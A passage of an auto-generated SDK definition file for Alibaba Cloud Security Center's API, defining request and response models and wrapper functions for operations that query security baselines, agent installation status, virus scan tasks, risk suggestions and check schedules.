              checkDesc?: string(name='CheckDesc', description='The description of the baseline.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
              checkId?: long(name='CheckId', description='The ID of the baseline.', example='1299'),
              checkItem?: string(name='CheckItem', description='The baseline.', example='Ensure password expiration period is set.'),
              rules?: [ 
                {
                  optional?: int32(name='Optional', description='Indicates whether the baseline can be edited. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
                  paramList?: [ 
                    {
                      enumValue?: string(name='EnumValue', description='If the value of paramType is 1, this parameter is empty. If the value of paramType is 2, this parameter provides the options that can be selected for paramType.', example='0,1,2,3'),
                      maxValue?: int32(name='MaxValue', description='The maximum value of the parameter.', example='999'),
                      minValue?: int32(name='MinValue', description='The minimum value of the parameter.', example='1'),
                      paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the parameter.', example='7'),
                      paramDesc?: string(name='ParamDesc', description='The description of the parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                      paramName?: string(name='ParamName', description='The name of the parameter.', example='range_val'),
                      paramType?: int32(name='ParamType', description='The configuration type of the parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                    }
                  ](name='ParamList', description='An array that consists of the parameters in the rule for the baseline.'),
                  ruleDesc?: string(name='RuleDesc', description='The description of the rule for the baseline.', example='Please customize the password expiration time detection standard as'),
                  ruleId?: string(name='RuleId', description='The ID of the rule for the baseline.', example='audit.audit_policy.auditpolicychange.cus'),
                }
              ](name='Rules', description='An array that consists of the rule details about the baseline.'),
            }
          ](name='CheckDetails', description='An array that consists of the check details about the baseline subtype.'),
          supportedOs?: string(name='SupportedOs', description='The operating system type of the server. Valid values:

- **windows**
- **linux**', example='linux'),
          typeName?: string(name='TypeName', description='The name of the baseline subtype.', example='hc_exploit_redis'),
        }
      ](name='SubTypes', description='An array that consists of the information about baseline subtypes.'),
      typeName?: string(name='TypeName', description='The name of the baseline type.', example='hc_exploit'),
    }
  ](name='RiskTypes', description='An array that consists of the information about baseline types.'),
}

model DescribeRiskTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskTypeResponseBody(name='body'),
}

/**
 * @summary Queries baseline types.
 *
 * @param request DescribeRiskTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskTypeResponse
 */
async function describeRiskTypeWithOptions(request: DescribeRiskTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries baseline types.
 *
 * @param request DescribeRiskTypeRequest
 * @return DescribeRiskTypeResponse
 */
async function describeRiskType(request: DescribeRiskTypeRequest): DescribeRiskTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskTypeWithOptions(request, runtime);
}

model DescribeRisksRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  limit?: int32(name='Limit', description='The maximum number of entries to return. Default value: 20.', example='10'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
  riskId?: long(name='RiskId', description='The baseline ID.

>  You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the baseline IDs.', example='75'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='docker'),
}

model DescribeRisksResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA54FE21-B006-5DFF-8D64-C4FFECDA****'),
  risks?: [ 
    {
      riskDetail?: string(name='RiskDetail', description='The description of the baseline.', example='Ubuntu 14,Ubuntu 16 ,Ubuntu 18,Ubuntu 20 baseline based on Alibaba Cloud best security practices'),
      riskId?: long(name='RiskId', description='The baseline ID.', example='54'),
      riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      riskType?: string(name='RiskType', description='The name of the baseline type.', example='cis'),
      subRiskType?: string(name='SubRiskType', description='The name of the baseline subtype.', example='hc_ubuntu'),
      subTypeAlias?: string(name='SubTypeAlias', description='The display name of the baseline subtype.', example='Alibaba Cloud Standard - Ubuntu Security Baseline'),
      typeAlias?: string(name='TypeAlias', description='The display name of the baseline type.', example='Best security practices'),
    }
  ](name='Risks', description='The baselines.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeRisksResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRisksResponseBody(name='body'),
}

/**
 * @summary Queries the information about baselines based on baseline IDs or names.
 *
 * @param request DescribeRisksRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRisksResponse
 */
async function describeRisksWithOptions(request: DescribeRisksRequest, runtime: Util.RuntimeOptions): DescribeRisksResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRisks',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about baselines based on baseline IDs or names.
 *
 * @param request DescribeRisksRequest
 * @return DescribeRisksResponse
 */
async function describeRisks(request: DescribeRisksRequest): DescribeRisksResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRisksWithOptions(request, runtime);
}

model DescribeSasPmAgentListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

This parameter is required.', example='inet-cb7ae5ee-b2bc-4581-b616-62495f5d****,inet-37cf0e4f-55cc-4b84-8073-b348b4b4****'),
}

model DescribeSasPmAgentListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='8EF3ACC2-9400-5B64-B72D-4A1D35113750'),
  sasPmAgentList?: [ 
    {
      aliyunAssistId?: string(name='AliyunAssistId', description='The ID of Cloud Assistant.', example='mi-hz034jn***yxhc0'),
      aliyunMonitorId?: string(name='AliyunMonitorId', description='The ID of the CloudMonitor agent.', example='5d5ef6be-54ff-11ed-82cf-8f01475e****'),
      assistInstallResult?: int32(name='AssistInstallResult', description='The installation result of Cloud Assistant. Valid values:

*   **0**: SUCCESS
*   **1**: MISSING_PARAM
*   **2**: UNKNOWN_SYSTEM
*   **3**: DOWNLOAD_FAILED
*   **4**: INSTALL_FAILED', example='0'),
      assistInstallStatus?: int32(name='AssistInstallStatus', description='The status of Cloud Assistant. Valid values:

*   **0**: installing
*   **1**: installed
*   **2**: installation failed
*   **3**: installation timed out', example='1'),
      monitorInstallResult?: int32(name='MonitorInstallResult', description='The installation result of the CloudMonitor agent. Valid values:

*   **0**: failed
*   **1**: successful', example='1'),
      monitorInstallStatus?: int32(name='MonitorInstallStatus', description='The status of the CloudMonitor agent. Valid values:

*   **0**: installation failed
*   **1**: installed', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='87f1724d-075e-48d3-95fd-78c2dd36****'),
    }
  ](name='SasPmAgentList', description='An array that consists of the information about servers.'),
}

model DescribeSasPmAgentListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSasPmAgentListResponseBody(name='body'),
}

/**
 * @summary Queries the servers on which you want to install Cloud Assistant or the CloudMonitor agent.
 *
 * @param request DescribeSasPmAgentListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSasPmAgentListResponse
 */
async function describeSasPmAgentListWithOptions(request: DescribeSasPmAgentListRequest, runtime: Util.RuntimeOptions): DescribeSasPmAgentListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSasPmAgentList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers on which you want to install Cloud Assistant or the CloudMonitor agent.
 *
 * @param request DescribeSasPmAgentListRequest
 * @return DescribeSasPmAgentListResponse
 */
async function describeSasPmAgentList(request: DescribeSasPmAgentListRequest): DescribeSasPmAgentListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSasPmAgentListWithOptions(request, runtime);
}

model DescribeScanTaskProgressRequest {
  taskId?: long(name='TaskId', description='The ID of the virus scan task.

>  You can call the [StartVirusScanTask](~~StartVirusScanTask~~) operation to query the IDs of virus scan tasks.

This parameter is required.', example='282832'),
}

model DescribeScanTaskProgressResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA15BA8A-D631-4375-8D40-CB7C769B0279'),
  scanTaskProgress?: string(name='ScanTaskProgress', description='The progress of the virus scan task. Valid values:

*   **init**: The task is being initialized.
*   **Processing**: The task is running.
*   **Success**: The task is complete.
*   **Failed**: The task fails.', example='Success'),
  targetInfo?: string(name='TargetInfo', description='The information about the asset on which the virus scan task runs. The value is a string that consists of JSON arrays. Each element in a JSON array is a JSON struct that contains the following fields:

*   **type**: the type of the asset on which you want to perform a virus scan task. Valid values:

    *   **groupId**: server group.
    *   **uuid**: server.

*   **name**: the name of the server group or server.

*   **target**: the asset on which the virus scan task runs. The value of this field varies based on the value of the type field.

    *   If the **type** field is set to **groupId**, the value of this field is the ID of the server group.
    *   If the **type** field is set to **uuid**, the value of this field is the universally unique identifier (UUID) of the server.', example='[{"type":"uuid","name":"host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model DescribeScanTaskProgressResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeScanTaskProgressResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a virus scan task.
 *
 * @param request DescribeScanTaskProgressRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeScanTaskProgressResponse
 */
async function describeScanTaskProgressWithOptions(request: DescribeScanTaskProgressRequest, runtime: Util.RuntimeOptions): DescribeScanTaskProgressResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskProgress',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a virus scan task.
 *
 * @param request DescribeScanTaskProgressRequest
 * @return DescribeScanTaskProgressResponse
 */
async function describeScanTaskProgress(request: DescribeScanTaskProgressRequest): DescribeScanTaskProgressResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskProgressWithOptions(request, runtime);
}

model DescribeScanTaskStatisticsRequest {
  levels?: string(name='Levels', description='The severities of the alert events handled by the virus detection task. Separate multiple severities with commas (,). The severities decrease in descending order. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious,remind'),
}

model DescribeScanTaskStatisticsResponseBody = {
  dealedRiskNum?: int32(name='DealedRiskNum', description='The number of risks that are handled for the user.', example='11'),
  personalTaskNum?: long(name='PersonalTaskNum', description='The total number of tasks that are created for the user.', example='11'),
  requestId?: string(name='RequestId', description='The request ID.', example='765EDBDE-1686-5DBA-B76F-2E0XXXXXXX'),
  totalTaskNum?: long(name='TotalTaskNum', description='The total number of virus detection tasks.', example='11'),
  userNum?: long(name='UserNum', description='The number of risks that are detected for the user.', example='11'),
}

model DescribeScanTaskStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeScanTaskStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of virus detection tasks.
 *
 * @param request DescribeScanTaskStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeScanTaskStatisticsResponse
 */
async function describeScanTaskStatisticsWithOptions(request: DescribeScanTaskStatisticsRequest, runtime: Util.RuntimeOptions): DescribeScanTaskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of virus detection tasks.
 *
 * @param request DescribeScanTaskStatisticsRequest
 * @return DescribeScanTaskStatisticsResponse
 */
async function describeScanTaskStatistics(request: DescribeScanTaskStatisticsRequest): DescribeScanTaskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskStatisticsWithOptions(request, runtime);
}

model DescribeScreenScoreThreadRequest {
  endTime?: long(name='EndTime', description='The end of the time range to query. This value is a UNIX timestamp. Unit: milliseconds.

This parameter is required.', example='1668064495000'),
  startTime?: long(name='StartTime', description='The beginning of the time range to query. This value is a UNIX timestamp. Unit: milliseconds.

This parameter is required.', example='1651290987000'),
}

model DescribeScreenScoreThreadResponseBody = {
  data?: {
    socreThread?: [ string ](name='SocreThread', description='The trends of the scores on the security dashboard.'),
    socreThreadDate?: [ string ](name='SocreThreadDate', description='The dates of the scores on the security dashboard.'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model DescribeScreenScoreThreadResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeScreenScoreThreadResponseBody(name='body'),
}

/**
 * @summary Queries the trends of the scores on the security dashboard.
 *
 * @param request DescribeScreenScoreThreadRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeScreenScoreThreadResponse
 */
async function describeScreenScoreThreadWithOptions(request: DescribeScreenScoreThreadRequest, runtime: Util.RuntimeOptions): DescribeScreenScoreThreadResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScreenScoreThread',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the trends of the scores on the security dashboard.
 *
 * @param request DescribeScreenScoreThreadRequest
 * @return DescribeScreenScoreThreadResponse
 */
async function describeScreenScoreThread(request: DescribeScreenScoreThreadRequest): DescribeScreenScoreThreadResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScreenScoreThreadWithOptions(request, runtime);
}

model DescribeSearchConditionRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='117.220.XX.XX'),
  type?: string(name='Type', description='The type of the asset. Valid values:

*   **ecs**: Elastic Compute Service (ECS) instances.
*   **cloud_product**: cloud services except ECS.', example='ecs'),
}

model DescribeSearchConditionResponseBody = {
  conditionList?: [ 
    {
      conditionType?: string(name='ConditionType', description='The type of the filter condition. Valid values:

*   **system**: default filter conditions.
*   **user**: custom filter conditions.', example='system'),
      filterConditions?: string(name='FilterConditions', description='The filter condition. The value of this parameter is in the JSON format and contains the following fields:

*   **filterParams**: the parameters of the filter condition. The value of this field is in the JSON format and contains the following fields:

    *   **labelKey**: the key for rendering.

    *   **label**: the display name.

    *   **value**: the value of the filter condition. The value of this field is in the JSON format and contains the following fields:

        *   **name**: the name of the filter item.
        *   **value**: the value of the filter item.

*   **LogicalExp**: the logical relationship among the filter conditions. Valid values:

    *   **AND**: The filter conditions are evaluated by using a logical **AND**.
    *   **OR**: The filter conditions are evaluated by using a logical **OR**.

>  If the value of **ConditionType** is **system**, **labelKey** is returned. The labelKey field is used only for internationalization rendering.', example='{\\\\"filterParams\\\\":[{\\\\"labelKey\\\\":\\\\"a|b\\\\",\\\\"value\\\\":\\\\"{\\\\\\\\\\\\"name\\\\\\\\\\\\":\\\\\\\\\\\\"sadsasd\\\\\\\\\\\\",\\\\\\\\\\\\"value\\\\\\\\\\\\":\\\\\\\\\\\\"dasdsdas\\\\\\\\\\\\"}\\\\"}],\\\\"LogicalExp\\\\":\\\\"OR\\\\"}'),
      name?: string(name='Name', description='The filter condition name.', example='StopMachine'),
      nameKey?: string(name='NameKey', description='The key of the filter condition name.', example='stop_machine'),
    }
  ](name='ConditionList', description='An array that consists of the filter conditions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3AEC47AF-8CFA-485E-AC9A-3A8ABC06EA7F'),
}

model DescribeSearchConditionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSearchConditionResponseBody(name='body'),
}

/**
 * @summary Queries the filter conditions that are used to search for assets.
 *
 * @param request DescribeSearchConditionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSearchConditionResponse
 */
async function describeSearchConditionWithOptions(request: DescribeSearchConditionRequest, runtime: Util.RuntimeOptions): DescribeSearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the filter conditions that are used to search for assets.
 *
 * @param request DescribeSearchConditionRequest
 * @return DescribeSearchConditionResponse
 */
async function describeSearchCondition(request: DescribeSearchConditionRequest): DescribeSearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSearchConditionWithOptions(request, runtime);
}

model DescribeSecureSuggestionRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSecureSuggestionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='676F80E3-4B3F-43DA-9CBB-5FF79F202AA2'),
  suggestions?: [ 
    {
      detail?: [ 
        {
          description?: string(name='Description', description='The description of the suggestion.', example='Malicious tampering of Web pages will affect your normal access to web page content, and may also lead to serious economic losses, brand losses, and even political risks. The webpage tamper-proof service can monitor the website directory in real time and restore the tampered files or directories through backup, so as to ensure that the website information of important systems is not tampered with maliciously and prevent the occurrence of horse hanging, black chain, illegal implantation of terrorist threats, pornography and other content.'),
          subType?: string(name='SubType', description='The sub-type of the unhandled risk. Valid values:

*   **ALARM_HIGH**: Unhandled Urgency Alerts
*   **ALARM_MEDIUM**: Unhandled Warning Alerts
*   **ALARM_LOW**: Unhandled Reminder Alerts
*   **VUL_EMR_UNCHECK**: Unchecked Urgent Vulnerabilities
*   **VUL_EMR_UNFIX**: Unfixed Urgent Vulnerabilities
*   **VUL_WIN**: Unfixed Windows Server Vulnerabilities
*   **VUL_LINUX**: Unfixed Linux Server Vulnerabilities
*   **VUL_CMS**: Unfixed CMS Vulnerabilities
*   **ACCESSKEY_LEAK**: AccessKey Leakage Risks
*   **HC_WARN**: Baseline Risks
*   **HC_WEAK_EXPLOIT_WARN**: There is a risk of weak passwords exposed by the public network.
*   **HC_WEAK_PASSWORD_WARN**: Risk of weak password
*   **HC_HIGH_EXPLOIT_WARN**: There is a high risk of invasion
*   **HC_OTHER_WARN**: Security Configuration risk
*   **HC_DATABASE_WARN**: Database has security risks
*   **CLOUD_HC_SAS_OPEN**: Security protection has not been installed on the server
*   **CLOUD_HC_AEGIS_OFFLINE**: Server protection status is offline
*   **CLOUD_HC_ACCOUNT_DOUBLE_CHECK**: Two-Factor Authentication not Enabled for Primary Account
*   **CLOUD_HC_RDS**: RDS-database security policy failed, security risks
*   **CLOUD_HC_DDOS**: Risks in Anti-DDoS Pro Back-to-Origin Settings
*   **CLOUD_HC_HIGH_LEVEL**: Cloud product configuration has high risk
*   **CLOUD_HC_OTHER_LEVEL**: Cloud product configuration has medium and low risk risks
*   **OTHER_ATTACH**: Attacks
*   **OTHER_DATABASE_ATTACH**: Database has security risks
*   **REINFORCE_BASELINE**: Config Assessment
*   **REINFORCE_SUSPICIOUS**: Antivirus
*   **REINFORCE_ANALYSIS**: Log Analysis
*   **REINFORCE_AK_LEAK**: AccessKey Leaked Intelligence Detection
*   **REINFORCE_WEB_LOCK**: Website tamper-proofing capability not configured
*   **REINFORCE_BRUTE_FORCE**: Anti brute force cracking
*   **REINFORCE_XPRESS_INSTALL**: One-click client installation
*   **REINFORCE_RANSOMWARE**: Enable anti-extortion strategy
*   **REINFORCE_UNI_RANSOMWARE**: Anti-ransomware for Databases
*   **REINFORCE_VIRUS_SCHEDULE_SCAN**: Periodic virus scan policies not configured
*   **REINFORCE_IMAGE_REPO_SCAN**: No container image scan range configured
*   **REINFORCE_IMAGE_SCAN_TASK**: Image security scan
*   **REINFORCE_K8S_LOG_ANALYSIS**: Container K8s threat detection is disabled
*   **REINFORCE_CONTAINER_NETWORK**: Container Visualization', example='REINFORCE_WEB_LOCK'),
          title?: string(name='Title', description='The name of the unhandled risk.', example='Website tamper-proofing capability not configured'),
        }
      ](name='Detail', description='The details of the suggestion.'),
      points?: int32(name='Points', description='The penalty point of a deduction item.', example='40'),
      suggestType?: string(name='SuggestType', description='The type of the unhandled risk. Valid values:

*   **SS_REINFORCE**: missing configuration of key features, such as malicious behavior defense
*   **SS_ALARM**: unhandled alerts
*   **SS_VUL**: unfixed vulnerabilities
*   **SS_HC**: baseline risks
*   **SS_AK**: AccessKey pair leaks
*   **SS_CLOUD_HC**: configuration risks of cloud services
*   **OTHER**: others', example='SS_ALARM'),
    }
  ](name='Suggestions', description='The suggestions on how to handle the risks.'),
  totalCount?: int32(name='TotalCount', description='The total number of unhandled security risks.', example='15'),
}

model DescribeSecureSuggestionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecureSuggestionResponseBody(name='body'),
}

/**
 * @summary Queries suggestions on how to handle the risks that affect the security score.
 *
 * @param request DescribeSecureSuggestionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecureSuggestionResponse
 */
async function describeSecureSuggestionWithOptions(request: DescribeSecureSuggestionRequest, runtime: Util.RuntimeOptions): DescribeSecureSuggestionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecureSuggestion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries suggestions on how to handle the risks that affect the security score.
 *
 * @param request DescribeSecureSuggestionRequest
 * @return DescribeSecureSuggestionResponse
 */
async function describeSecureSuggestion(request: DescribeSecureSuggestionRequest): DescribeSecureSuggestionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecureSuggestionWithOptions(request, runtime);
}

model DescribeSecurityCheckScheduleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
  riskCheckJobConfig?: {
    daysOfWeek?: string(name='DaysOfWeek', description='The day of the week when the check tasks are performed. Multiple days can be specified. Multiple days are separated by commas (,).

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='1,2,3'),
    endTime?: int32(name='EndTime', description='The time range during which check tasks end. Valid values:

*   **6**: 00:00 to 06:00
*   **12**: 06:00 to 12:00
*   **18**: 12:00 to 18:00
*   **24**: 18:00 to 24:00', example='12'),
    startTime?: int32(name='StartTime', description='The time range during which check tasks start. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6'),
  }(name='RiskCheckJobConfig', description='The configurations of custom check tasks.'),
}

model DescribeSecurityCheckScheduleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeSecurityCheckScheduleConfig is deprecated
 *
 * @summary Queries the day of a week when custom check tasks are performed and the time range during which the custom check tasks are performed.
 *
 * @description This operation is phased out. You can use the GetCheckConfig operation.
 *
 * @param request DescribeSecurityCheckScheduleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfigWithOptions(request: DescribeSecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribeSecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
